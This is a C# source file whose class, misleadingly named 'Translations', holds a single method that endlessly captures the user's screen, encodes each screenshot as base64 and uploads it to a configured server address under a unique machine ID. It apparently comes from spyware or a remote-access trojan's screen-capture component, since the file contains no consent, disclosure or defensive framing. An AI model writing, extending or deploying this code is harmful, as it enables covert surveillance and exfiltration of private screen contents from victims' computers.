using Newtonsoft.Json;
using System;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;

internal class Translations
{
    // Asynchronous method for taking a screenshot and sending it to the server
    public static async Task ScreenshotCallbackAsync()
    {
        while (true)
        {
            try
            {
                Bitmap screenshot = await Task.Run(() =>
                {
                    // Creating a Bitmap object to store a screenshot with screen dimensions
                    Bitmap bmp = new Bitmap(Variables.lastScreen.Bounds.Width, Variables.lastScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                    // Using Graphics to Capture Screen Images
                    using (Graphics gfx = Graphics.FromImage(bmp))
                    {
                        // Copy the screen image to Bitmap starting from the coordinates (0, 0)
                        gfx.CopyFromScreen(Variables.lastScreen.Bounds.X, Variables.lastScreen.Bounds.Y, 0, 0, Variables.lastScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    }

                    return bmp;
                });

                string screenshotBase64;
                // Create a MemoryStream to store an image in memory
                using (MemoryStream ms = new MemoryStream())
                {
                    // Save the image in PNG format to a stream
                    screenshot.Save(ms, ImageFormat.Png);
                    // Convert the image to a byte array
                    byte[] imageBytes = ms.ToArray();
                    // Converting a byte array to a Base64 string
                    screenshotBase64 = Convert.ToBase64String(imageBytes);
                }

                // Forming a URL for sending a screenshot
                string url = $"{Variables.ip}/upload_screenshot/{Variables.uniqueId}";
                // Create an HTTP request to the specified URL
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "POST"; // Set the POST request method
                request.ContentType = "application/json"; // Set the request content type

                // We send the screenshot data in the body of the request
                using (StreamWriter streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    // Create a JSON object with a Base64 screenshot string
                    string json = JsonConvert.SerializeObject(new { screenshot = screenshotBase64 });
                    // Write a JSON string to the request stream
                    await streamWriter.WriteAsync(json);
                }

                // Receiving a response from the server
                using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())
                {
                    // Reading the server response stream
                    using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
                    {
                        // Reading the response as a string
                        string result = await streamReader.ReadToEndAsync();
                        // Printing the response from the server to the console
                        Console.WriteLine("Response from the server: " + result);
                    }
                }
            }
            catch (Exception ex)
            {
                // Display an error message if something went wrong
                Console.WriteLine("Error in method ScreenshotCallback: " + ex.Message);
            }
        }
    }
}
